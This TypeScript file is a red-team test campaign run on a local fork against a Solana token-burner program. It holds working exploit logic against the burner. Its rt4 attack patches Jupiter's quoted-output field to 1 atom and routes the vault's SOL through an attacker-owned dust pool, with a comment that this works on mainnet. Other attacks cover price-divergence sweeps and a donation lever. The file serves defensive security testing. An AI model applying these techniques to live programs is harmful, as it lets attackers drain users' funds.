/**
 * RED-TEAM CAMPAIGN against the keyless burner (fork-only; loopback refused
 * otherwise). Every attack is a REAL on-chain transaction against the REAL
 * deployed artifact; `surfnet_setAccount` is used ONLY where the attack
 * requires state an attacker would own on mainnet (their own pool's
 * reserves), never to touch the vault, the program, or any account the
 * program validates by derivation.
 *
 * Attacks:
 *   rt4   dust-reference extraction: hostile bound reference (gross 5000 SOL
 *         / dust tokens -- a pool an attacker OWNS), route through it at the
 *         program's own floor. Measures realized extraction vs fair value.
 *   rt2   divergence boundary sweep: honest bound reference, exec venue moved
 *         by X bps; find the largest accepted X (the real tolerance bound).
 *   rt5   donation lever: donate REAL WSOL to the bound reference; measure
 *         floor/cap shift and attempt extraction at the deflated floor.
 *   rt8   Mode B is deleted: validate_config 0x01 must refuse at dispatch
 *         (6027), including the previously-valid sentinel-over-NEIRO shape.
 *
 * Env: RPC, BURNER_PROGRAM_ID, PAYER_KEYPAIR (default ~/.config/solana/id.json)
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionMessage,
  VersionedTransaction,
  ComputeBudgetProgram,
} from "@solana/web3.js";
import {
  createAssociatedTokenAccountIdempotentInstruction,
  getAssociatedTokenAddressSync,
  NATIVE_MINT,
  TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { deriveVault, buildBurnInstruction } from "../quote-service/core";
import {
  SolanaRpcGateway,
  JupiterV2HttpClient,
} from "../quote-service/adapters";
import { resolveReference } from "../quote-service/reference";

const RPC_URL = process.env.RPC ?? "";
if (!/^http:\/\/(127\.0\.0\.1|localhost)(:\d+)?(\/|$)/.test(RPC_URL)) {
  throw new Error(`refusing non-loopback RPC ${RPC_URL}`);
}
const PROGRAM = new PublicKey(process.env.BURNER_PROGRAM_ID ?? "");
const NEIRO = new PublicKey("CTg3ZgYx79zrE1MteDVkmkcGniiFrK1hJ6yiabropump");
const NEIRO_V4_POOL = new PublicKey(
  process.env.TARGET_REFERENCE ?? "HvAqakZgurMR2br1eGWPU6EeFcxzmeW8n6Mn7ejEf3DV"
);
const ATTACK = process.argv[2] ?? "";
/** Fork-only venue restriction: a fork cannot serve RFQ/orderbook venues. */
const POOL_DEXES = [
  "Raydium",
  "Raydium CLMM",
  "Raydium CP",
  "Whirlpool",
  "Meteora",
  "Meteora DLMM",
  "Meteora DAMM v2",
  "Pump.fun Amm",
  "Pump.fun",
];
const SOL = 1_000_000_000n;

const c = new Connection(RPC_URL, "confirmed");
const payer = Keypair.fromSecretKey(
  Uint8Array.from(
    JSON.parse(
      fs.readFileSync(
        process.env.PAYER_KEYPAIR ??
          path.join(os.homedir(), ".config", "solana", "id.json"),
        "utf8"
      ) as number[]
    )
  )
);
const chain = new SolanaRpcGateway(c);

async function confirm(sig: string) {
  for (let i = 0; i < 90; i++) {
    const tx = await c
      .getTransaction(sig, {
        commitment: "confirmed",
        maxSupportedTransactionVersion: 0,
      })
      .catch(() => null);
    if (tx) return tx;
    await new Promise((r) => setTimeout(r, 1000));
  }
  throw new Error(`unconfirmed: ${sig}`);
}

async function sendPlain(instructions: any[]) {
  const { blockhash } = await c.getLatestBlockhash("confirmed");
  const msg = new TransactionMessage({
    payerKey: payer.publicKey,
    recentBlockhash: blockhash,
    instructions: [ComputeBudgetProgram.setComputeUnitLimit({ units: 500_000 }), ...instructions],
  }).compileToV0Message();
  const tx = new VersionedTransaction(msg);
  tx.sign([payer]);
  const sig = await c.sendRawTransaction(tx.serialize(), { skipPreflight: true });
  const landed = await confirm(sig);
  if (landed.meta?.err) {
    const logs = (landed.meta.logMessages ?? []).join("\n");
    const err = new Error(`sendPlain failed: ${JSON.stringify(landed.meta.err)}\n${logs}`);
    (err as any).logs = landed.meta.logMessages;
    throw err;
  }
  return landed;
}

/** Fork-only state write: make an attacker-OWNED pool's reserves whatever the
 * attack needs. Never used on any account the program derives or pins. */
async function setVaultAmount(vault: PublicKey, amount: bigint) {
  const ai = await c.getAccountInfo(vault);
  if (!ai) throw new Error(`no account at ${vault.toBase58()}`);
  const data = Buffer.from(ai.data);
  data.writeBigUInt64LE(amount, 64);
  const res = await fetch(RPC_URL, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0",
      id: 1,
      method: "surfnet_setAccount",
      params: [
        vault.toBase58(),
        {
          lamports: ai.lamports,
          owner: ai.owner.toBase58(),
          data: data.toString("hex"),
          executable: ai.executable,
        },
      ],
    }),
  });
  const j: any = await res.json();
  if (j.error) throw new Error(`setAccount failed: ${JSON.stringify(j.error)}`);
}

async function setupVault(reference: PublicKey) {
  const ref = await resolveReference(chain, NEIRO, reference);
  const legs = [{ targetMint: NEIRO, bps: 10_000, refSeed: ref.seed }];
  const vault = deriveVault(PROGRAM, NEIRO, legs);
  const wsolAta = getAssociatedTokenAddressSync(NATIVE_MINT, vault, true, TOKEN_PROGRAM_ID);
  const targetAta = getAssociatedTokenAddressSync(NEIRO, vault, true, TOKEN_PROGRAM_ID);
  await sendPlain([
    createAssociatedTokenAccountIdempotentInstruction(payer.publicKey, wsolAta, vault, NATIVE_MINT, TOKEN_PROGRAM_ID),
    createAssociatedTokenAccountIdempotentInstruction(payer.publicKey, targetAta, vault, NEIRO, TOKEN_PROGRAM_ID),
    SystemProgram.transfer({ fromPubkey: payer.publicKey, toPubkey: vault, lamports: 3n * SOL }),
  ]);
  return { ref, vault, wsolAta, targetAta };
}

async function readAta(tokenAccount: PublicKey) {
  const ai = await c.getAccountInfo(tokenAccount);
  if (!ai) return 0n;
  return Buffer.from(ai.data).readBigUInt64LE(64);
}

/** Build + submit one hostile burn with caller-chosen minimum_output and
 * dexes-restricted route. Returns the tx (even when it FAILED on chain). */
function bigIntToLE(v: bigint): Buffer {
  const b = Buffer.alloc(8);
  b.writeBigUInt64LE(v);
  return b;
}

async function hostileBurn(opts: {
  ref: Awaited<ReturnType<typeof resolveReference>>;
  vault: PublicKey;
  wsolAta: PublicKey;
  targetAta: PublicKey;
  amount: bigint;
  minimumOutput: bigint;
  dexes?: string[];
  patchQuotedOut?: boolean;
}) {
  const jupiter = new JupiterV2HttpClient(
    process.env.JUPITER_V2_URL ?? "https://api.jup.ag/swap/v2/",
    process.env.JUPITER_API_KEY
  );
  const build = await jupiter.build({
    inputMint: NATIVE_MINT,
    outputMint: NEIRO,
    amount: opts.amount,
    taker: opts.vault,
    slippageBps: 1_500,
    dexes: opts.dexes ?? POOL_DEXES,
    destinationTokenAccount: opts.targetAta,
  } as any);
  const swapIx = build.swapInstruction;
  if (!swapIx) throw new Error("no swap instruction from Jupiter");
  let routeData = Buffer.from(swapIx.data, "base64");
  // ATTACKER MOVE (works on mainnet, no fork primitive needed): the burner
  // pins in_amount but NOT Jupiter's quoted_out_amount, so the attacker
  // patches Jupiter's own on-chain slippage check down to 1 atom. Jupiter
  // will then execute whatever the (attacker-shaped) pool pays.
  if (opts.patchQuotedOut) {
    const amtLE = opts.amount;
    const direct = routeData.subarray(8, 16).equals(Buffer.from(bigIntToLE(amtLE)));
    const off = direct ? 16 : 17; // shared variant has the u8 id at byte 8
    routeData = Buffer.from(routeData);
    routeData.writeBigUInt64LE(1n, off);
  }
  const legs = [
    {
      targetMint: NEIRO,
      targetTokenProgram: TOKEN_PROGRAM_ID,
      targetAta: opts.targetAta,
      bps: 10_000,
      amountIn: opts.amount,
      minimumOutput: opts.minimumOutput,
      reference: opts.ref,
      routeAccounts: swapIx.accounts,
      routeData,
      lookupTables: [],
    },
  ];
  const ix = buildBurnInstruction(PROGRAM, payer.publicKey, NEIRO, opts.vault, opts.wsolAta, opts.amount, legs);
  const { blockhash } = await c.getLatestBlockhash("confirmed");
  const msg = new TransactionMessage({
    payerKey: payer.publicKey,
    recentBlockhash: blockhash,
    instructions: [ComputeBudgetProgram.setComputeUnitLimit({ units: 1_200_000 }), ix],
  }).compileToV0Message();
  const tx = new VersionedTransaction(msg);
  tx.sign([payer]);
  const sig = await c.sendRawTransaction(tx.serialize(), { skipPreflight: true });
  const landed = await confirm(sig);
  const err = landed.meta?.err ?? null;
  const logs = (landed.meta?.logMessages ?? []).join("\n");
  const codeMatch = logs.match(/custom program error: (0x[0-9a-fA-F]+)/);
  // the program logs every burn via sol_log_64(0,0,0,amount_in,burned):
  // "Program log: 0x0 0x0 0x0 0x<in> 0x<burned>"
  const burnLog = [...logs.matchAll(/Program log: 0x0 0x0 0x0 0x([0-9a-f]+) 0x([0-9a-f]+)/g)];
  const burned = burnLog.length ? BigInt("0x" + burnLog[burnLog.length - 1][2]) : -1n;
  return {
    sig,
    err,
    code: codeMatch ? parseInt(codeMatch[1], 16) : null,
    received: burned,
    logs,
  };
}

function fairValue(tokens: bigint, ref: { floorFor(a: bigint): bigint } & any, amount: bigint) {
  // fair tokens per the reference's own spot is what an honest floor
  // represents; report received/fair ratio via the pre-manipulation floor
  return tokens;
}

async function rt4() {
  console.log("== RT4: hostile bound reference (attacker-owned dust pool) ==");
  const { ref, vault, wsolAta, targetAta } = await setupVault(NEIRO_V4_POOL);
  console.log(`vault ${vault.toBase58()}  reference ${ref.pool.toBase58()} (${ref.venue})`);
  console.log(`honest state: depth ${Number(ref.depthLamports) / 1e9} SOL, cap ${Number(ref.capLamports) / 1e9} SOL`);
  const amount = 500_000_000n; // 0.5 SOL

  // baseline: honest burn at the honest floor -> value received
  const honest = await hostileBurn({ ref, vault, wsolAta, targetAta, amount, minimumOutput: ref.floorFor(amount) });
  console.log(`honest burn: err=${JSON.stringify(honest.err)} burned=${honest.received} atoms NEIRO (${Number(honest.received) / 1e6})`);
  if (honest.err) throw new Error("honest baseline burn failed");
  const fairTokens = honest.received;

  // attacker owns the bound pool: gross 5000 SOL on the WSOL side, dust on
  // the token side (their LP capital; fully recoverable on a CPMM they own)
  const poolData = await c.getAccountInfo(ref.pool);
  const d = Buffer.from(poolData!.data);
  const vaultA = new PublicKey(d.subarray(336, 368));
  const vaultB = new PublicKey(d.subarray(368, 400));
  const aInfo = await c.getAccountInfo(vaultA);
  const bInfo = await c.getAccountInfo(vaultB);
  const aIsSol = Buffer.from(aInfo!.data).subarray(0, 32).equals(NATIVE_MINT.toBuffer());
  const solVault = aIsSol ? vaultA : vaultB;
  const tokVault = aIsSol ? vaultB : vaultA;
  await setVaultAmount(solVault, 5_000n * SOL);
  await setVaultAmount(tokVault, 100_000n); // 0.1 NEIRO -- dust value, floor >= 1
  const hostile = await resolveReference(chain, NEIRO, NEIRO_V4_POOL);
  console.log(`hostile state: depth ${Number(hostile.depthLamports) / 1e9} SOL, cap ${Number(hostile.capLamports) / 1e9} SOL, floor(0.5 SOL)=${hostile.floorFor(amount)} atoms`);
  const floor = hostile.floorFor(amount);
  const attack = await hostileBurn({ ref: hostile, vault, wsolAta, targetAta, amount, minimumOutput: floor, dexes: ["Raydium"], patchQuotedOut: true });
  console.log(`hostile burn: err=${JSON.stringify(attack.err)} code=${attack.code} burned=${attack.received} atoms`);
  if (!attack.err) {
    const pct = Number(attack.received) / Number(fairTokens);
    console.log(`EXTRACTION: vault paid 0.5 SOL, received ${(pct * 100).toFixed(6)}% of fair value`);
    console.log(`attacker (pool owner) gained ~0.5 SOL; tokens given up worth ~nothing; LP capital recoverable`);
  } else {
    console.log(`hostile burn REFUSED: ${JSON.stringify(attack.err)} code=${attack.code}`);
    console.log(attack.logs.split("\n").filter((l) => l.includes("failed") || l.includes("Error")).slice(-4).join("\n"));
  }
}

async function rt2() {
  console.log("== RT2: exec-venue divergence boundary sweep (honest bound reference) ==");
  const { ref, vault, wsolAta, targetAta } = await setupVault(NEIRO_V4_POOL);
  const amount = 200_000_000n; // 0.2 SOL
  const dexes = ["Meteora DLMM"];
  const DLMM = new PublicKey("LBUZKhRxPF3XUpBCjp4YzTKgLccjZhTSDM9YuVaPwxo");
  for (const bpsMove of [50, 90, 150, 300]) {
    const jupiter = new JupiterV2HttpClient(
      process.env.JUPITER_V2_URL ?? "https://api.jup.ag/swap/v2/",
      process.env.JUPITER_API_KEY
    );
    const probe = await jupiter.build({
      inputMint: NATIVE_MINT,
      outputMint: NEIRO,
      amount,
      taker: vault,
      slippageBps: 1_500,
      dexes,
      destinationTokenAccount: targetAta,
    } as any);
    const routeAccts: string[] = probe.swapInstruction.accounts.map((a: any) => a.pubkey);
    // DLMM LbPair in the route: owned by the DLMM program, holds the vault
    // addresses at data offsets 152..216.
    let pool: PublicKey | null = null;
    for (const a of routeAccts) {
      const info = await c.getAccountInfo(new PublicKey(a));
      if (info && info.owner.equals(DLMM) && info.data.length >= 250) {
        pool = new PublicKey(a);
        break;
      }
    }
    if (!pool) {
      console.log(`bpsMove=${bpsMove}: no DLMM pair in route; skipping`);
      continue;
    }
    const pd = Buffer.from((await c.getAccountInfo(pool))!.data);
    const v0 = new PublicKey(pd.subarray(152, 184));
    const v1 = new PublicKey(pd.subarray(184, 216));
    const v0i = await c.getAccountInfo(v0);
    const v1i = await c.getAccountInfo(v1);
    const v0Sol = Buffer.from(v0i!.data).subarray(0, 32).equals(NATIVE_MINT.toBuffer());
    const solVault = v0Sol ? v0 : v1;
    const solAmt = Buffer.from((v0Sol ? v0i : v1i)!.data).readBigUInt64LE(64);
    const drain = (solAmt * BigInt(bpsMove)) / 10_000n;
    await setVaultAmount(solVault, solAmt - drain);
    // honest reference untouched: the v4 pool
    const ref2 = await resolveReference(chain, NEIRO, NEIRO_V4_POOL);
    const floor = ref2.floorFor(amount);
    const r = await hostileBurn({ ref: ref2, vault, wsolAta, targetAta, amount, minimumOutput: floor, dexes });
    console.log(
      `exec DLMM moved +${bpsMove}bps: err=${JSON.stringify(r.err)} code=${r.code} burned=${r.received} atoms (floor demanded ${floor})`
    );
  }
}

async function rt5() {
  console.log("== RT5: donation lever (real WSOL into the bound reference) ==");
  const { ref, vault, wsolAta, targetAta } = await setupVault(NEIRO_V4_POOL);
  const poolData = await c.getAccountInfo(ref.pool)!;
  const d = Buffer.from(poolData!.data);
  const vaultA = new PublicKey(d.subarray(336, 368));
  const vaultB = new PublicKey(d.subarray(368, 400));
  const aIsSol = Buffer.from((await c.getAccountInfo(vaultA))!.data)
    .subarray(0, 32)
    .equals(NATIVE_MINT.toBuffer());
  const solVault = aIsSol ? vaultA : vaultB;
  console.log(`before: depth=${Number(ref.depthLamports) / 1e9} SOL cap=${Number(ref.capLamports) / 1e9} SOL floor(0.5)=${ref.floorFor(500_000_000n)}`);
  // wrap 50 SOL and donate to the reference pool's WSOL vault
  const payerWsol = getAssociatedTokenAddressSync(NATIVE_MINT, payer.publicKey, false, TOKEN_PROGRAM_ID);
  await sendPlain([
    createAssociatedTokenAccountIdempotentInstruction(payer.publicKey, payerWsol, payer.publicKey, NATIVE_MINT, TOKEN_PROGRAM_ID),
    SystemProgram.transfer({ fromPubkey: payer.publicKey, toPubkey: payerWsol, lamports: 50n * SOL }),
    new (await import("@solana/spl-token")).createSyncNativeInstruction(payerWsol),
    (await import("@solana/spl-token")).createTransferInstruction(payerWsol, solVault, payer.publicKey, 50n * SOL),
  ]);
  const after = await resolveReference(chain, NEIRO, NEIRO_V4_POOL);
  console.log(`after 50 SOL donation: depth=${Number(after.depthLamports) / 1e9} SOL cap=${Number(after.capLamports) / 1e9} SOL floor(0.5)=${after.floorFor(500_000_000n)}`);
  const amount = 500_000_000n;
  const honestRef = ref;
  const r = await hostileBurn({ ref: after, vault, wsolAta, targetAta, amount, minimumOutput: after.floorFor(amount) });
  console.log(`burn at deflated floor: err=${JSON.stringify(r.err)} received=${r.received} (honest floor was ${honestRef.floorFor(amount)})`);
}

async function rt8() {
  console.log("== RT8: Mode B sentinel drift brick ==");
  const { vault } = await setupVault(NEIRO_V4_POOL);
  // Mode B validate_config with SENTINEL refs for a Raydium-target vault.
  const data = Buffer.alloc(8 + 1 + 4 + 2 + 32);
  Buffer.from([28, 98, 92, 82, 243, 62, 65, 93]).copy(data, 0); // validate_config disc
  data[8] = 0x01; // Mode B
  data.writeUInt32LE(1, 9);
  data.writeUInt16LE(10_000, 13);
  // refs: 32 zero bytes = sentinel
  const burnPda = new PublicKey(PublicKey.findProgramAddressSync(
    [
      Buffer.from("burner"),
      NEIRO.toBuffer(),
      NEIRO.toBuffer(),
      Buffer.from([16, 39]), // 10000 LE
      Buffer.alloc(32),
    ],
    PROGRAM
  )[0]);
  const wsolAta = getAssociatedTokenAddressSync(NATIVE_MINT, burnPda, true, TOKEN_PROGRAM_ID);
  const ix = new (await import("@solana/web3.js")).TransactionInstruction({
    programId: PROGRAM,
    keys: [
      { pubkey: burnPda, isSigner: false, isWritable: false },
      { pubkey: wsolAta, isSigner: false, isWritable: false },
      { pubkey: NEIRO, isSigner: false, isWritable: false },
      { pubkey: NEIRO, isSigner: false, isWritable: false },
    ],
    data,
  });
  try {
    await sendPlain([ix]);
    throw new Error(
      `Mode B PASSED on-chain for sentinel-ref vault ${burnPda.toBase58()} — RT8 expected 6027`
    );
  } catch (e: any) {
    const msg = String(e.message ?? e);
    if (msg.includes("RT8 expected 6027")) throw e;
    const hex = msg.match(/custom program error: (0x[0-9a-f]+)/i);
    const json = msg.match(/"Custom"\s*:\s*(\d+)/);
    const code = hex ? parseInt(hex[1], 16) : json ? Number(json[1]) : undefined;
    if (code === 6027) {
      console.log(`PASS RT8: Mode B refused at dispatch (6027 InvalidInstructionData)`);
      return;
    }
    console.log(`Mode B refused with unexpected error: ${msg}`);
    if (code !== undefined) console.log(`burner code: ${code}`);
    throw e;
  }
}

async function main() {
  switch (ATTACK) {
    case "rt4":
      await rt4();
      break;
    case "rt2":
      await rt2();
      break;
    case "rt5":
      await rt5();
      break;
    case "rt8":
      await rt8();
      break;
    default:
      console.error("usage: redteam-campaign.ts rt4|rt2|rt5|rt8");
      process.exit(1);
  }
}
main().catch((e) => {
  console.error(`FAIL: ${e.message ?? e}`);
  console.error(e.stack);
  process.exit(1);
});
